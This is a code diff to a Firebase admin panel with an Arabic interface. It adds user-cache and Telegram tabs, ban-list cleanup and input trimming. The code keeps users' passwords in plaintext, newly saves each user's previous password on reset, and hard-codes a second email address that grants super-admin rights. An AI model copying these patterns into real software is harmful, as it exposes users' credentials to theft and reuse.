@@ -4,7 +4,7 @@ import { db, storage } from '../lib/firebase';
 import { collection, getDocs, doc, updateDoc, addDoc, deleteDoc, query, orderBy, Timestamp, setDoc, getDoc, limit, onSnapshot } from 'firebase/firestore';
 import { ref, uploadBytes, getDownloadURL, deleteObject } from 'firebase/storage';
 import { StoreManager } from './StoreManager';
-import { Users, Key, Image as ImageIcon, Settings as SettingsIcon, Trash2, Ban, CheckCircle, Upload, RefreshCw, X, FileText, Link as LinkIcon, Link2, BadgeCheck, Wifi, Smartphone, Store, UserPlus, Lock, Unlock, Shield, ShieldPlus, ShieldOff, GitBranch, Download, ShieldCheck, PowerOff, Power, AlertTriangle, Eye, EyeOff, Copy, Check, CheckCircle2, Loader2, Server, Clock, UserCheck, Search, Filter, Crown } from 'lucide-react';
+import { Users, Key, Image as ImageIcon, Settings as SettingsIcon, Trash2, Ban, CheckCircle, Upload, RefreshCw, X, FileText, Link as LinkIcon, Link2, BadgeCheck, Wifi, Smartphone, Store, UserPlus, Lock, Unlock, Shield, ShieldPlus, ShieldOff, GitBranch, Download, ShieldCheck, PowerOff, Power, AlertTriangle, Eye, EyeOff, Copy, Check, CheckCircle2, Loader2, Server, Clock, UserCheck, Search, Filter, Crown, Send } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getAuth, createUserWithEmailAndPassword } from 'firebase/auth';
 import firebaseConfig from '../../firebase-applet-config.json';
@@ -12,6 +12,8 @@ import { logActivity } from '../utils/logger';
 import { AccountVersionsTab } from './admin/AccountVersionsTab';
 import { FeatureAccessControlTab } from './admin/FeatureAccessControlTab';
 import { ExternalLinksManagerTab } from './admin/ExternalLinksManagerTab';
+import { UserCacheTab } from './admin/UserCacheTab';
+import { TelegramTab } from './admin/TelegramTab';
 import { MaintenanceScreen } from './MaintenanceScreen';
 
 // Secondary app for creating users without logging out admin
@@ -26,7 +28,7 @@ interface AdminPanelProps {
 const EXPORT_FORMATS = ['AE Project', 'SVGA 2.0 EX', 'SVGA 2.0', 'Image Sequence', 'GIF (Animation)', 'APNG (Animation)', 'WebM (Video)', 'WebP (Animated)', 'VAP 1.0.5', 'VAP (MP4)', 'SVGA → YYEVA'];
 
 export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel }) => {
-  const [activeTab, setActiveTab] = useState<'users' | 'store' | 'keys' | 'assets' | 'settings' | 'records' | 'account_versions' | 'features_access' | 'server_outage' | 'external_links'>('users');
+  const [activeTab, setActiveTab] = useState<'users' | 'store' | 'keys' | 'assets' | 'settings' | 'records' | 'account_versions' | 'features_access' | 'server_outage' | 'external_links' | 'user_cache' | 'telegram'>('users');
   const [dropdownState, setDropdownState] = useState<{ userId: string; x: number; y: number; position: 'top' | 'bottom' } | null>(null);
   const [subDropdownState, setSubDropdownState] = useState<{ userId: string; x: number; y: number; position: 'top' | 'bottom' } | null>(null);
   const [loading, setLoading] = useState(false);
@@ -83,6 +85,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
 
   const TABS = [
     { id: 'users', label: 'المستخدمين', icon: <Users /> },
+    { id: 'user_cache', label: 'كاش المستخدمين ☠️', icon: <span className="text-base">☠️</span> },
+    { id: 'telegram', label: 'إرسال لـ Telegram 🚀', icon: <Send className="text-sky-400" /> },
     { id: 'features_access', label: 'تحديد الوظائف', icon: <ShieldCheck /> },
     { id: 'external_links', label: 'روابط الداشبورد', icon: <Link2 className="text-cyan-400" /> },
     { id: 'server_outage', label: 'تعطيل سيرفر التطبيق', icon: <PowerOff className="text-rose-400" /> },
@@ -141,10 +145,12 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
     try {
       const targetUser = resetPasswordModal.user;
       const newPass = resetPasswordModal.newPassword.trim();
+      const oldPass = (targetUser.plainPassword || targetUser.password || '').trim();
       
       const updates: any = {
         password: newPass,
         plainPassword: newPass,
+        oldPassword: oldPass,
         passwordUpdatedAt: Timestamp.now()
       };
 
@@ -172,26 +178,32 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
     }
   };
 
-  const isSuperAdmin = (user: UserRecord) => user.isSuperAdmin || (user.role === 'admin' && user.email === 'iejehdgdig@gmail.com');
+  const isSuperAdmin = (user: UserRecord) => user.isSuperAdmin || (user.role === 'admin' && (user.email === 'iejehdgdig@gmail.com' || user.email === 'uhbijnokmpl098900@gmail.com'));
 
   const CACHE_DURATION = 30000; // 30 seconds
 
-  // ... (rest of the component)
-
   const handleCreateUser = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!newUser.name || !newUser.email || !newUser.password) return alert("يرجى ملء جميع الحقول");
+    const cleanEmail = (newUser.email || '').trim().toLowerCase();
+    const cleanPass = (newUser.password || '').trim();
+    const cleanName = (newUser.name || '').trim();
+
+    if (!cleanName || !cleanEmail || !cleanPass) return alert("يرجى ملء جميع الحقول");
+    if (cleanPass.length < 6) return alert("كلمة المرور يجب أن تكون 6 أحرف على الأقل");
     
     setCreatingUser(true);
     try {
-      const { user } = await createUserWithEmailAndPassword(secondaryAuth, newUser.email, newUser.password);
+      const { user } = await createUserWithEmailAndPassword(secondaryAuth, cleanEmail, cleanPass);
+      const generatedDeviceId = (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function')
+        ? crypto.randomUUID()
+        : `dev_${Date.now()}_${Math.random().toString(36).substring(2)}`;
       
       const userData: UserRecord = {
         id: user.uid,
-        name: newUser.name,
-        email: newUser.email,
-        password: newUser.password,
-        plainPassword: newUser.password,
+        name: cleanName,
+        email: cleanEmail,
+        password: cleanPass,
+        plainPassword: cleanPass,
         role: newUser.role,
         isApproved: true,
         isVIP: newUser.role === 'admin' || newUser.role === 'moderator',
@@ -202,8 +214,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
         subscriptionExpiry: (newUser.role === 'admin' || newUser.role === 'moderator') ? Timestamp.fromDate(new Date(Date.now() + 1000 * 60 * 60 * 24 * 365)) : null,
         createdAt: Timestamp.now(),
         lastLogin: Timestamp.now(),
-        deviceId: 'admin_created',
-        lastIp: '0.0.0.0',
+        deviceId: generatedDeviceId,
+        lastIp: '127.0.0.1',
         hasSvgaExAccess: newUser.role === 'admin' || newUser.role === 'moderator',
         permissions: newUser.role === 'moderator' ? ['users'] : []
       };
@@ -308,8 +320,31 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
           getDocs(collection(db, 'banned_ips')),
           getDocs(collection(db, 'banned_devices'))
         ]);
-        const ips = ipSnap.docs.map(d => d.data().ip);
-        const devices = deviceSnap.docs.map(d => d.id);
+        
+        // Exclude dummy placeholders like 0.0.0.0 or admin_created and cleanup
+        const dummyIps = ['0.0.0.0', '127.0.0.1', 'unknown', 'local', '::1'];
+        const dummyDevices = ['admin_created', 'unknown', 'default', 'undefined', 'null'];
+
+        const ips: string[] = [];
+        for (const d of ipSnap.docs) {
+          const ipVal = d.data()?.ip || d.id;
+          if (dummyIps.includes(ipVal)) {
+            deleteDoc(doc(db, 'banned_ips', d.id)).catch(() => {});
+          } else {
+            ips.push(ipVal);
+          }
+        }
+
+        const devices: string[] = [];
+        for (const d of deviceSnap.docs) {
+          const devId = d.id;
+          if (dummyDevices.includes(devId)) {
+            deleteDoc(doc(db, 'banned_devices', devId)).catch(() => {});
+          } else {
+            devices.push(devId);
+          }
+        }
+
         setBannedIps(ips);
         setBannedDevices(devices);
         
@@ -368,40 +403,51 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
       const newStatus = user.status === 'banned' ? 'active' : 'banned';
       await updateDoc(doc(db, 'users', user.id), { status: newStatus });
       
-      // Also track in banned_emails to prevent re-registration
+      // Also sync banned_emails
       if (user.email) {
-        const emailDocId = (user.email || '').toLowerCase().replace(/\./g, '_');
+        const cleanEmail = user.email.trim().toLowerCase();
+        const emailDocId = cleanEmail.replace(/\./g, '_');
         if (newStatus === 'banned') {
           await setDoc(doc(db, 'banned_emails', emailDocId), {
-            email: (user.email || '').toLowerCase(),
+            email: cleanEmail,
             userId: user.id,
             bannedAt: Timestamp.now()
           });
         } else {
-          await deleteDoc(doc(db, 'banned_emails', emailDocId));
+          await Promise.all([
+            deleteDoc(doc(db, 'banned_emails', emailDocId)).catch(() => {}),
+            deleteDoc(doc(db, 'banned_emails', cleanEmail)).catch(() => {})
+          ]);
         }
       }
 
       setUsers(users.map(u => u.id === user.id ? { ...u, status: newStatus as any } : u));
     } catch (error) {
       console.error("Error updating user:", error);
+      alert("حدث خطأ أثناء تعديل حالة المستخدم");
     }
   };
 
   const handleBanIp = async (ip: string | undefined) => {
     if (!ip) return alert("لا يوجد عنوان IP لهذا المستخدم");
-    const ipDocId = ip.replace(/\./g, '_');
-    const isBanned = bannedIps.includes(ip);
+    const cleanIp = ip.trim();
+    const dummyIps = ['0.0.0.0', '127.0.0.1', 'unknown', 'local', '::1'];
+    if (dummyIps.includes(cleanIp)) {
+      return alert("لا يمكن حظر هذا الـ IP لأنه عنوان افتراضي أو محلي.");
+    }
+
+    const ipDocId = cleanIp.replace(/\./g, '_');
+    const isBanned = bannedIps.includes(cleanIp);
     
     if (!confirm(isBanned ? 'هل تريد فك حظر هذه الشبكة؟' : 'هل تريد حظر هذه الشبكة بالكامل؟')) return;
 
     try {
       if (isBanned) {
         await deleteDoc(doc(db, 'banned_ips', ipDocId));
-        setBannedIps(bannedIps.filter(i => i !== ip));
+        setBannedIps(bannedIps.filter(i => i !== cleanIp));
       } else {
-        await setDoc(doc(db, 'banned_ips', ipDocId), { ip, bannedAt: Timestamp.now() });
-        setBannedIps([...bannedIps, ip]);
+        await setDoc(doc(db, 'banned_ips', ipDocId), { ip: cleanIp, bannedAt: Timestamp.now() });
+        setBannedIps([...bannedIps, cleanIp]);
       }
     } catch (e) {
       console.error("IP Ban error:", e);
@@ -410,17 +456,23 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
 
   const handleBanDevice = async (deviceId: string | undefined) => {
     if (!deviceId) return alert("لا يوجد معرف جهاز لهذا المستخدم");
-    const isBanned = bannedDevices.includes(deviceId);
+    const cleanDev = deviceId.trim();
+    const dummyDevices = ['admin_created', 'unknown', 'default', 'undefined', 'null', ''];
+    if (dummyDevices.includes(cleanDev)) {
+      return alert("لا يمكن حظر معرف جهاز افتراضي.");
+    }
+
+    const isBanned = bannedDevices.includes(cleanDev);
     
     if (!confirm(isBanned ? 'هل تريد فك حظر هذا الجهاز؟' : 'هل تريد حظر هذا الجهاز بالكامل؟')) return;
 
     try {
       if (isBanned) {
-        await deleteDoc(doc(db, 'banned_devices', deviceId));
-        setBannedDevices(bannedDevices.filter(d => d !== deviceId));
+        await deleteDoc(doc(db, 'banned_devices', cleanDev));
+        setBannedDevices(bannedDevices.filter(d => d !== cleanDev));
       } else {
-        await setDoc(doc(db, 'banned_devices', deviceId), { bannedAt: Timestamp.now() });
-        setBannedDevices([...bannedDevices, deviceId]);
+        await setDoc(doc(db, 'banned_devices', cleanDev), { bannedAt: Timestamp.now() });
+        setBannedDevices([...bannedDevices, cleanDev]);
       }
     } catch (e) {
       console.error("Device Ban error:", e);
@@ -927,6 +979,16 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
           ) : (
             <>
               {activeTab === 'features_access' && <FeatureAccessControlTab />}
+              {activeTab === 'user_cache' && (
+                <UserCacheTab 
+                  currentUser={currentUser} 
+                  users={users} 
+                  onRefreshUsers={fetchData} 
+                />
+              )}
+              {activeTab === 'telegram' && (
+                <TelegramTab currentUser={currentUser} />
+              )}
               {activeTab === 'external_links' && (
                 <ExternalLinksManagerTab 
                   settings={settings} 
@@ -962,6 +1024,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
                           <th className="p-3">الحالة</th>
                           <th className="p-3">الاشتراك</th>
                           <th className="p-3">عضوية VIP</th>
+                          <th className="p-3">الكاش ☠️</th>
                           <th className="p-3">الإجراءات</th>
                         </tr>
                       </thead>
@@ -970,6 +1033,11 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
                           <tr key={user.id} className="border-b border-white/5 hover:bg-white/5 transition-colors">
                             <td className="p-3 font-medium flex items-center gap-2">
                                 {user.name}
+                                {user.hasCacheAccess && (
+                                  <span className="px-2 py-0.5 rounded-lg text-[10px] font-black bg-gradient-to-r from-red-950 to-slate-900 text-red-400 border border-red-500/60 shadow-sm flex items-center gap-1">
+                                    ☠️ CACHE
+                                  </span>
+                                )}
                                 {isSuperAdmin(user) && <span title="المدير العام"><BadgeCheck className="w-4 h-4 text-amber-400" /></span>}
                                 {user.role === 'admin' && !isSuperAdmin(user) && <span title="مسؤول"><BadgeCheck className="w-4 h-4 text-blue-400" /></span>}
                                 {user.role === 'moderator' && <span title="مشرف"><Shield className="w-4 h-4 text-green-400" /></span>}
@@ -1041,6 +1109,31 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ currentUser, onCancel })
                               >
                                 <Crown className={`w-3.5 h-3.5 ${user.isVIP ? 'text-amber-400' : 'text-slate-500'}`} />
                                 <span>{user.isVIP ? 'VIP 👑' : 'تفعيل'}</span>
+                              </button>
+                            </td>
+                            <td className="p-3">
+                              <button
+                                onClick={async () => {
+                                  try {
+                                    const nextState = !user.hasCacheAccess;
+                                    await updateDoc(doc(db, 'users', user.id), {
+                                      hasCacheAccess: nextState,
+                                      cachePermissions: { view: true, download: true, copyLink: true, delete: false, manage: false }
+                                    });
+                                    setUsers(prev => prev.map(u => u.id === user.id ? { ...u, hasCacheAccess: nextState } : u));
+                                  } catch (e: any) {
+                                    alert('خطأ في تغيير حالة الكاش: ' + e.message);
+                                  }
+                                }}
+                                className={`px-2.5 py-1 rounded-lg text-xs font-black transition-all flex items-center gap-1.5 border ${
+                                  user.hasCacheAccess
+                                    ? 'bg-gradient-to-r from-red-950 via-slate-900 to-red-950 text-red-400 border-red-500 shadow-sm shadow-red-950/50 hover:brightness-125'
+                                    : 'bg-slate-800/40 text-slate-500 border-white/5 hover:border-red-500/30 hover:text-red-400'
+                                }`}
+                                title={user.hasCacheAccess ? 'الكاش مفعّل (اضغط للتعطيل والإخفاء)' : 'الكاش معطّل ومخفي (اضغط للتفعيل)'}
+                              >
+                                <span>☠️</span>
+                                <span>{user.hasCacheAccess ? 'مفعّل ON' : 'معطّل OFF'}</span>
                               </button>
                             </td>
                             <td className="p-3 flex gap-2">
